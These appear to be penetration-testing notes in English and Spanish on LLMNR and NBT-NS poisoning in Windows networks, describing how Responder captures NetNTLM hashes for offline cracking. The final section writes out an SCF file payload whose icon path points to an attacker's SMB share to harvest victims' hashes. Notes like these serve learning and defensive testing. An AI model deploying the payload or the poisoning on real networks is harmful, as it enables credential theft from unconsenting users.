# LLMNR poisoning & NBT-NS

## Link-Local Multicast Name Resolution
- The goal of Link-Local Multicast Name Resolution (LLMNR) is to enable name resolution in scenarios in which conventional DNS name resolution is not possible.  LLMNR supports all current and future DNS formats, types, and classes, while operating on a separate port from DNS, and with a distinct resolver cache.  Since LLMNR only operates on the local link, it cannot be considered a substitute for DNS.
## NetBIOS Name Service
- [microsoft docs](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN)
## The poisoning
- the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.
- The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests.
- If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password.

## Useful tools for this poisoning
- Responder
- Inveigh
- Metasploit framework


[a medium post](https://stridergearhead.medium.com/llmnr-poisoning-an-ad-attack-1265f5365332)

## SCF + LLMNR poisoning
- Primero creamos un artchivo SCF con el siguiente contenido:
```[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
- El nombre del archivo tiene que ser algo como `@Inventory.scf`.
- Este archivo lo tenemos que poner en un share que sea accesible por la victima.
- Luego, con responder capturamos el hash de la victima y lo crackeamos.